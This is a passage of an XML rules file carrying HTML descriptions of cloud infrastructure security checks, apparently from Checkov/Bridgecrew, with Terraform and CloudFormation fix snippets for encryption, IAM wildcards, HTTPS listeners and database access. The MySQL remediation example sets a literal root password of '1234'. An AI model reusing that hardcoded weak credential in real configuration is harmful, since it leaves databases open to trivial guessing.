<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.b.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.b.tf">resource "aws_s3_bucket" "b" {
  bucket = "my-tf-test-bucket"
  acl    = "private"

  versioning {
    enabled = true
  +  mfa_delete = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_24' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_24</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_24' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_94</key>
    <name>Ensure Glue Data Catalog encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="glue-data-catalog-encryption-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-glue-data-catalog-encryption-is-not-enabled"></div>Glue Data Catalog encryption is not enabled</div><a aria-label="Skip link to Glue Data Catalog encryption is not enabled" class="heading-anchor-icon fa fa-anchor" href="#glue-data-catalog-encryption-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This examines the resource <strong>aws_glue_data_catalog_encryption_settings</strong> and checks that encryption is set up. The properties <strong>encrypted_at_rest</strong> and <strong>connection_encrypted</strong> in the blocks <strong>connection_password_encryption</strong> and <strong>encryption_at_rest</strong> are examined.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong> aws_glue_data_catalog_encryption_settings</li>
<li><strong>Arguments</strong> data_catalog_encryption_settings\connection_password_encryption and data_catalog_encryption_settings\encryption_at_rest blocks</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_glue_data_catalog_encryption_settings.examplea.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_glue_data_catalog_encryption_settings.examplea.tf">resource "aws_glue_data_catalog_encryption_settings" "example" {
  ...
+  data_catalog_encryption_settings {
+    connection_password_encryption {
+      aws_kms_key_id                       = aws_kms_key.glue.arn
+      return_connection_password_encrypted = true
+    }
+    encryption_at_rest {
+      catalog_encryption_mode = "SSE-KMS"
+      sse_aws_kms_key_id      = aws_kms_key.glue.arn
+    }
+  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong> AWS::Glue::DataCatalogEncryptionSettings</li>
<li><strong>Arguments</strong> Properties.DataCatalogEncryptionSettings</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Example:
    Type: 'AWS::Glue::DataCatalogEncryptionSettings'
    Properties:
        ...
      DataCatalogEncryptionSettings:
        ConnectionPasswordEncryption:
          ...
+         ReturnConnectionPasswordEncrypted: True
        EncryptionAtRest:
            ...
+         CatalogEncryptionMode: "SSE-KMS"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_37' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_37</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_37' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_96</key>
    <name>Ensure all data stored in Aurora is securely encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-data-stored-in-aurora-is-securely-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-data-stored-in-aurora-is-securely-encrypted-at-rest"></div>Not all data stored in Aurora is securely encrypted at rest</div><a aria-label="Skip link to Not all data stored in Aurora is securely encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#not-all-data-stored-in-aurora-is-securely-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy examines the resource <strong>aws_rds_cluster</strong> to check that encryption is set up. The property  <strong>storage_encrypted</strong> is examined.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster </li>
<li><strong>Argument:</strong> storage_encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_rds_cluster.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_rds_cluster.test.tf">resource "aws_rds_cluster" "example" {
  ...
  cluster_identifier      = "aurora-cluster-demo"
+ storage_encrypted       = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::RDS::DBCluster </li>
<li><strong>Argument:</strong> Properties.StorageEncrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Aurora:
    Type: 'AWS::RDS::DBCluster'
    Properties:
      ...
      Engine: 'aurora'
+     StorageEncrypted: true
            ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_38' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_38</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_38' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_49</key>
    <name>Ensure IAM policy documents do not allow * (asterisk) as a statement's action</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-policy-documents-allow--asterisk-as-a-statements-action"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-policy-documents-allow-asterisk-as-a-statements-action"></div>IAM policy documents allow * (asterisk) as a statement's action</div><a aria-label="Skip link to IAM policy documents allow * (asterisk) as a statement's action" class="heading-anchor-icon fa fa-anchor" href="#iam-policy-documents-allow--asterisk-as-a-statements-action"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Action element describes the specific action or actions that will be allowed or denied. Statements must include either an Action or NotAction element. Each AWS service has its own set of actions that describe tasks that can be performed with that service. Specify a value using a namespace that identifies a service, for example, iam, ec2 sqs, sns, s3, followed by the name of the action to be allowed or denied. The name must match an action that is supported by the service.</p>
<p>We recommend you do not allow "*" (all resource) statements as part of action elements. This level of access could potentially grant unwanted and unregulated access to anyone given this policy document setting. We recommend you to write a refined policy describing the specific action allowed or required by the specific policy holder.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">Amazon IAM console</a>.</li>
<li>In the navigation pane, choose <strong>Policies</strong>.</li>
<li>In the list of policies, choose the policy name of the policy to edit. You can use the Filter menu and the search box to filter the list of policies.</li>
<li>Choose the <strong>Permissions </strong>tab, then choose <strong>Edit Policy</strong>.</li>
<li>Identify any Action statements permitting actions access to all resources ("*").</li>
<li>On the Review page, review the policy Summary, then click <strong>Save Changes</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Argument</strong>: statement</li>
<li><strong>Attribute</strong>: action<br/>
Example fix:</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_iam_policy</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_iam_policy">resource "aws_iam_policy" "example" {
   # ... other configuration ...
   policy = &lt;&lt;POLICY
 {
   "Version": "2012-10-17",
   "Statement": {
     "Effect": "Allow",
-    "Action": "*",
     "Resource": "*"
   }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_iam_43' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_iam_43</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_iam_43' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_7</key>
    <name>Ensure a MySQL database instance does not allow anyone to connect with administrative privileges</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="a-mysql-database-instance-allows-anyone-to-connect-with-administrative-privileges"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-a-my-sql-database-instance-allows-anyone-to-connect-with-administrative-privileges"></div>A MySQL database instance allows anyone to connect with administrative privileges</div><a aria-label="Skip link to A MySQL database instance allows anyone to connect with administrative privileges" class="heading-anchor-icon fa fa-anchor" href="#a-mysql-database-instance-allows-anyone-to-connect-with-administrative-privileges"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended to set a password for the administrative user (root by default) to prevent unauthorized access to the SQL database instances.<br/>
This recommendation is applicable only for MySQL Instances. PostgreSQL does not offer any setting for No Password from the cloud console.<br/>
At the time of MySQL Instance creation, not providing an administrative password allows anyone to connect to the SQL database instance with administrative privileges. The root password should be set to ensure only authorized users have these privileges.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_sql_database_instance</li>
<li><strong>Argument:</strong> google_sql_user</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_user" "root_with_password" {
  name     = "root"
  instance = google_sql_database_instance.db_instance.name
  host     = "me.com"
+ password = "1234"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-a-mysql-database-instance-does-not-allow-anyone-to-connect-with-administrative-privileges' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-a-mysql-database-instance-does-not-allow-anyone-to-connect-with-administrative-privileges</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-a-mysql-database-instance-does-not-allow-anyone-to-connect-with-administrative-privileges' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_63</key>
    <name>Ensure bucket does not log to itself</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bucket-logs-to-itself"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bucket-logs-to-itself"></div>Bucket logs to itself</div><a aria-label="Skip link to Bucket logs to itself" class="heading-anchor-icon fa fa-anchor" href="#bucket-logs-to-itself"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A check to ensure that the specified logging bucket is not itself. A bucket must not log access to itself, logging requires a second separate bucket.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_storage_bucket<br/>
This check will trigger if you attempt to self reference:</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_storage_bucket.mylovelybucket,tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_storage_bucket.mylovelybucket,tf">resource "google_storage_bucket" "mylovelybucket" {
  name     = "mylovelybucket"
  location = var.location
  uniform_bucket_level_access = true
  logging {
    log_bucket = "mylovelybucket"
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_logging_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_2</key>
    <name>Ensure ALB protocol is HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alb-protocol-is-not-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alb-protocol-is-not-https"></div>ALB protocol is not HTTPS</div><a aria-label="Skip link to ALB protocol is not HTTPS" class="heading-anchor-icon fa fa-anchor" href="#alb-protocol-is-not-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>An internet-facing AWS ELB/ALB is a public resource on your network that is completely exposed to the internet. It has a publicly resolvable DNS name, that can accept HTTP(S) requests from clients over the Internet. External actors gaining knowledge to this information can potentially attempt to access the EC2 instances that are registered with the load balancer.</p>
<p>When an AWS ALB has no HTTPS listeners, front-end connections between the web clients and the load balancer could become targeted by man-in-the-middle attacks and traffic interception techniques.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>
<p>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</p>
</li>
<li>
<p>Open the <a href="http://console.aws.amazon.com/ec2/" target="_self">Amazon EC2 console</a>.</p>
</li>
<li>
<p>Navigate to <strong>LOAD BALANCING</strong>, select <strong>Load Balancers</strong>.</p>
</li>
<li>
<p>Select a <em>load balancer</em>, then select <strong>Listeners</strong>. </p>
</li>
<li>
<p>To add a <em>listener</em>, select <strong>Add Listener</strong>. </p>
<ol>
<li>For Protocol : port, select HTTPS and keep the default port or type a different port.</li>
<li>For Default actions, do one of the following:<br/>
&#8226;	Choose Add action, Forward to and choose a target group.<br/>
&#8226;	Choose Add action, Redirect to and provide the URL for the redirect.<br/>
&#8226;	Choose Add action, Return fixed response and provide a response code and optional response body.<br/>
To save the action, select the <strong>checkmark</strong> icon.</li>
<li>For Security policy, it is recommended that you keep the default security policy.</li>
<li>For Default SSL certificate, do one of the following:<br/>
&#8226;	If you created or imported a <em>certificate</em> using <strong>AWS Certificate Manager</strong>, select <strong>From ACM</strong> and select the <em>certificate</em>.<br/>
&#8226;	If you uploaded a <em>certificate</em> using <strong>IAM</strong>, select <strong>From IAM</strong> and select the <em>certificate</em>.</li>
</ol>
</li>
<li>
<p>Click <strong>Save</strong>.</p>
</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::ElasticLoadBalancingV2::Listener</li>
<li><strong>Arguments:</strong> Properties.Protocol / Properties.DefaultActions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    ListenerHTTPS:
    Type: AWS::ElasticLoadBalancingV2::Listener
    Properties:
      ...
      # Option 1:
+     Protocol: HTTPS # Or TCP / TLS / UDP / TCP_UDP
      # Option 2:
+     DefaultActions:
+       - Type: redirect
+         RedirectConfig:
+           Protocol: HTTPS
            ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_29' target='_blank'> https://docs.bridgecrew.io/docs/networking_29</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_29' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_123</key>
    <name>Ensure VPC endpoint service is configured for manual acceptance</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="vpc-endpoint-service-is-not-configured-for-manual-acceptance"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-vpc-endpoint-service-is-not-configured-for-manual-acceptance"></div>VPC endpoint service is not configured for manual acceptance</div><a aria-label="Skip link to VPC endpoint service is not configured for manual acceptance" class="heading-anchor-icon fa fa-anchor" href="#vpc-endpoint-service-is-not-configured-for-manual-acceptance"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_vpc_endpoint_service</li>
<li><strong>Argument:</strong> acceptance_required</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_vpc_endpoint_service" "example" {
        ...
+   acceptance_required        = true
    network_load_balancer_arns = [aws_lb.example.arn]
 }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::EC2::VPCEndpointService</li>
<li><strong>Argument:</strong> Properties.AcceptanceRequired</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::EC2::VPCEndpointService
    Properties: 
        ...
+     AcceptanceRequired: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-vpc-endpoint-service-is-configured-for-manual-acceptance' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-vpc-endpoint-service-is-configured-for-manual-acceptance</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-vpc-endpoint-service-is-configured-for-manual-acceptance' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_128</key>
    <name>Ensure Amazon RDS clusters and instances have AWS IAM authentication enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-authentication-for-amazon-rds-clusters-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-authentication-for-amazon-rds-clusters-is-disabled"></div>IAM authentication for Amazon RDS clusters is disabled </div><a aria-label="Skip link to IAM authentication for Amazon RDS clusters is disabled " class="heading-anchor-icon fa fa-anchor" href="#iam-authentication-for-amazon-rds-clusters-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA. Identity and Access Management (IAM) </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
